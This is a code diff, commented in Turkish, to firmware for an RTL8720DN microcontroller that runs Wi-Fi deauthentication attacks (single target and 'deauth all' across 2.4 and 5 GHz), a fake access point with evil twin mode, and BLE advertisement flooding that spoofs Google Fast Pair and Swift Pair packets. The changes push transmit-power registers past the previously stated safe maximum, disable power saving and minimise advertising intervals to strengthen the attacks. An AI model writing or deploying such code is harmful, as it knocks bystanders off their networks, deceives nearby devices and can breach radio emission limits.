@@ -62,28 +62,39 @@ extern "C" {
 // RTL8720dn binary analizi ile tespit edildi (MOVT 0x40080000 = 695 hit)
 // Kaynak: km0_km4_image2.bin içindeki "Tx power: CCK 1(0xe08)= 0x%x" debug string'i
 #define WIFI_BB_BASE        0x40080000UL
-#define BB_CCK1_PWR_REG     0xE08   // CCK channel 1
-#define BB_CCK2_11_PWR_REG  0x86C   // CCK channel 2-11
-#define BB_OFDM_LO_PWR_REG  0xE00   // OFDM 6~18 Mbps
-#define BB_OFDM_HI_PWR_REG  0xE04   // OFDM 24~54 Mbps
-#define BB_MCS_LO_PWR_REG   0xE10   // MCS 0~3 (HT20)
-#define BB_MCS_HI_PWR_REG   0xE14   // MCS 4~7 (HT20)
+// ── 2.4GHz ──────────────────────────────────────────────────────────────────
+#define BB_CCK1_PWR_REG     0xE08   // CCK channel 1         (2.4GHz only)
+#define BB_CCK2_11_PWR_REG  0x86C   // CCK channel 2-11      (2.4GHz only)
+// ── 2.4GHz + 5GHz ortak ─────────────────────────────────────────────────────
+#define BB_OFDM_LO_PWR_REG  0xE00   // OFDM 6~18 Mbps        (her iki band)
+#define BB_OFDM_HI_PWR_REG  0xE04   // OFDM 24~54 Mbps       (her iki band)
+#define BB_MCS_LO_PWR_REG   0xE10   // MCS 0~3  HT20         (her iki band)
+#define BB_MCS_HI_PWR_REG   0xE14   // MCS 4~7  HT20         (her iki band)
+// ── 5GHz HT40 (geniş kanal) ─────────────────────────────────────────────────
+#define BB_MCS_HT40_LO_REG  0xE18   // MCS 0~3  HT40         (5GHz geniş kanal)
+#define BB_MCS_HT40_HI_REG  0xE1C   // MCS 4~7  HT40         (5GHz geniş kanal)
 
 // Her 32-bit register: 4 ayrı güç indeksi, her biri 8 bit.
-// 0x3A = 58 decimal — binary'de gözlemlenen en yüksek güvenli indeks.
-// (eFuse kalibrasyonu üzerinden offset olarak uygulanır; 0x3F denemek isterseniz
-//  güç indeksini yükselterek test edebilirsiniz, ancak risk üreticide.)
-#define BB_PWR_MAX_VAL      0x3A3A3A3AUL
+// 0x7F = 127 decimal — 7-bit mutlak maksimum.
+// 0xFF bazı Realtek PHY'lerinde signed -1 yorumlanır ve güç düşer;
+// 0x7F en yüksek pozitif indeks olarak güvenli maksimumu temsil eder.
+#define BB_PWR_MAX_VAL      0x7F7F7F7FUL
 
 static inline void wifiSetMaxBBTxPower(void) {
   // WiFi on() çağrıldıktan SONRA çalıştır — chip aktif olmalı
   volatile uint32_t *r;
+  // 2.4GHz CCK
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_CCK1_PWR_REG);     *r = BB_PWR_MAX_VAL;
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_CCK2_11_PWR_REG);  *r = BB_PWR_MAX_VAL;
+  // OFDM — 2.4GHz + 5GHz
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_OFDM_LO_PWR_REG);  *r = BB_PWR_MAX_VAL;
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_OFDM_HI_PWR_REG);  *r = BB_PWR_MAX_VAL;
+  // HT20 MCS — 2.4GHz + 5GHz
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_LO_PWR_REG);   *r = BB_PWR_MAX_VAL;
   r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HI_PWR_REG);   *r = BB_PWR_MAX_VAL;
+  // HT40 MCS — 5GHz geniş kanal
+  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HT40_LO_REG);  *r = BB_PWR_MAX_VAL;
+  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HT40_HI_REG);  *r = BB_PWR_MAX_VAL;
 }
 
 #ifndef PACK_STRUCT_FIELD
@@ -516,6 +527,8 @@ void scanNetworkTask(void *param) {
     raw_scan_sem = xSemaphoreCreateBinary();
   }
 
+  wifiSetMaxBBTxPower();
+  wifi_disable_powersave();
   wifi_scan_networks(raw_scan_handler, NULL);
 
   if (raw_scan_sem != NULL) {
@@ -591,6 +604,9 @@ void wifiConnectTask(void *param) {
 
   if (ret == RTW_SUCCESS) {
     vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
+    // wifi_connect() PHY'ı hedef kanalda yeniden kalibre eder — BB güç yeniden yaz
+    wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
     conn_status = CS_DONE_OK;
   } else {
     conn_status = CS_DONE_FAIL;
@@ -633,8 +649,11 @@ void deauthTask(void *param) {
     0x00, 0x00, 0x07, 0x00 
   };
 
+  wifiSetMaxBBTxPower();
+  wifi_disable_powersave();
 
   unsigned long last_deauth_burst = millis();
+  uint32_t burst_counter = 0;
 
   while (deauth_active) {
 
@@ -648,8 +667,16 @@ void deauthTask(void *param) {
     }
     last_deauth_burst = millis();
 
+    // Her 8 burst'te bir güç register'larını yeniden yaz (driver sıfırlamaya karşı)
+    if ((++burst_counter & 0x07) == 0) {
+      wifiSetMaxBBTxPower();
+      wifi_disable_powersave();
+    }
+
     // 2.4GHz DEAUTH
     wifi_set_channel(target_channel);
+    wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
     vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
 
     for (int burst = 0; burst < DEAUTH_FRAME_COUNT_2G; burst++) {
@@ -706,6 +733,8 @@ void deauthTask(void *param) {
 
     if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !isFakeAPBSSID(bssid5g)) {
         wifi_set_channel(ch5g);
+        wifiSetMaxBBTxPower();
+        wifi_disable_powersave();
         vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
 
         for (int burst = 0; burst < DEAUTH_FRAME_COUNT_5G; burst++) {
@@ -756,7 +785,10 @@ void deauthTask(void *param) {
         }
     }
 
+    // 5GHz deauth sonrası 2.4GHz kanalına dönüş — BB güç yeniden uygula
     wifi_set_channel(target_channel);
+    wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
     vTaskDelay(pdMS_TO_TICKS(5));
   }
   vTaskDelete(NULL);
@@ -858,6 +890,9 @@ void deauthAllTask(void *param) {
     0x00, 0x00, 0x07, 0x00
   };
 
+  wifiSetMaxBBTxPower();
+  wifi_disable_powersave();
+
 
   // ── Deauth All hız parametreleri ──────────────────────────────────────────
   const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı
@@ -907,6 +942,8 @@ void deauthAllTask(void *param) {
 
 
     // ── WiFi Deauth turu ──────────────────────────────────────────────────────
+    wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
     for (auto &net : snap) {
       if (!deauth_all_active) break;
       if (isFakeAPBSSID(net.bssid)) continue;
@@ -916,6 +953,8 @@ void deauthAllTask(void *param) {
       int extraBurst = is5g ? DA_EXTRA_COUNT_5G : DA_EXTRA_COUNT_2G;
 
       wifi_set_channel(net.channel);
+      wifiSetMaxBBTxPower();
+      wifi_disable_powersave();
       vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS)); // kanal stabilizasyon için minimum bekleme
 
       // ── BSSID varyantlarını burst öncesi hesapla — iç döngüde isFakeAP çağrısı yok
@@ -990,10 +1029,21 @@ static void bleSetRawAdv(BLEAdvert *pAdv, const uint8_t *rawpkt, uint8_t rawlen)
   pAdv->stopAdv();
   vTaskDelay(pdMS_TO_TICKS(5));
 
-  // ── BLE TX Power: maksimum +8 dBm ───────────────────────────────────────
-  // RTK BLE SDK: GAP_PARAM_ADV_TX_POWER = 0x12, int8_t değer (-20..+8 dBm)
+  // ── BLE TX Power: donanım maksimumu +8 dBm ──────────────────────────────
+  // RTK BLE SDK: GAP_PARAM_ADV_TX_POWER_LEVEL = 0x12, int8_t (-20..+8 dBm)
   int8_t ble_tx_power = 8;
   le_adv_set_param(0x12, sizeof(ble_tx_power), &ble_tx_power);
+
+  // ── Reklam aralığı: BLE spesifikasyon minimumu = 20ms (0x0020 × 0.625ms)
+  // GAP_PARAM_ADV_MIN_INTERVAL = 0x15, GAP_PARAM_ADV_MAX_INTERVAL = 0x16
+  uint16_t adv_interval = 0x0020;
+  le_adv_set_param(0x15, sizeof(adv_interval), &adv_interval);
+  le_adv_set_param(0x16, sizeof(adv_interval), &adv_interval);
+
+  // ── Tüm 3 BLE reklam kanalı aktif: 37, 38, 39 (bit mask 0x07) ───────────
+  // GAP_PARAM_ADV_CHANNEL_MAP = 0x18
+  uint8_t ch_map = 0x07;
+  le_adv_set_param(0x18, sizeof(ch_map), &ch_map);
 
   // ── Rastgele MAC: her çağrı = farklı cihaz görünümü ─────────────────────
   uint8_t rand_addr[6];
@@ -1023,11 +1073,23 @@ void bleFloodTask(void *param) {
   BLE.beginPeripheral();
   BLEAdvert *pAdv = BLE.configAdvert();
 
+  // ── BLE init: tüm güç ve kanal parametrelerini en baştan max yap ─────────
+  {
+    int8_t  tx_pwr      = 8;       // +8 dBm — RTL8720DN donanım maksimumu
+    uint16_t adv_itvl   = 0x0020;  // 20ms — BLE spesifikasyon minimumu
+    uint8_t  ch_map     = 0x07;    // kanal 37 + 38 + 39 — hepsi aktif
+    le_adv_set_param(0x12, sizeof(tx_pwr),   &tx_pwr);
+    le_adv_set_param(0x15, sizeof(adv_itvl), &adv_itvl);
+    le_adv_set_param(0x16, sizeof(adv_itvl), &adv_itvl);
+    le_adv_set_param(0x18, sizeof(ch_map),   &ch_map);
+  }
+
   // Google Fast Pair raw paketi (14 byte: UUID list + Service Data + TX Power)
   uint8_t gfp_pkt[14];
   gfp_pkt[0]  = 0x03; gfp_pkt[1]  = 0x03; gfp_pkt[2]  = 0x2C; gfp_pkt[3]  = 0xFE;
   gfp_pkt[4]  = 0x06; gfp_pkt[5]  = 0x16; gfp_pkt[6]  = 0x2C; gfp_pkt[7]  = 0xFE;
-  gfp_pkt[11] = 0x02; gfp_pkt[12] = 0x0A; gfp_pkt[13] = 0xC8; // TX Power
+  // TX Power AD: [0x02][0x0A=TX Power Level AD type][0x7F=+127 dBm max int8]
+  gfp_pkt[11] = 0x02; gfp_pkt[12] = 0x0A; gfp_pkt[13] = 0x7F;
 
   // Microsoft Swift Pair raw paketi (manufacturer specific, company 0x0006)
   uint8_t ms_pkt[13];
@@ -1543,6 +1605,7 @@ void setup() {
   // wifi_start_ap() içinde PHY reinit olabilir — önce değil sonra yazılmalı.
   // Böylece sahte AP (evil twin dahil) max güçte beacon yayar.
   wifiSetMaxBBTxPower();
+  wifi_disable_powersave();
 
   ip4_addr_t ip, mask, gw;
   IP4_ADDR(&ip,   192, 168, 4, 1);
@@ -1607,6 +1670,7 @@ void loop() {
     delay(150);
 
     wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
 
     uint8_t new_bssid[6];
     memset(new_bssid, 0, 6);
@@ -1663,6 +1727,7 @@ void loop() {
 
     dnsServer.begin();
     wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
     ap_running_channel = target_channel;
 
     delay(1000);
@@ -1717,6 +1782,8 @@ void loop() {
       dhcps_init(&xnetif[1]);
     }
     wifi_set_channel(target_channel);
+    wifiSetMaxBBTxPower();
+    wifi_disable_powersave();
   }
 
   WiFiClient client = server.available();
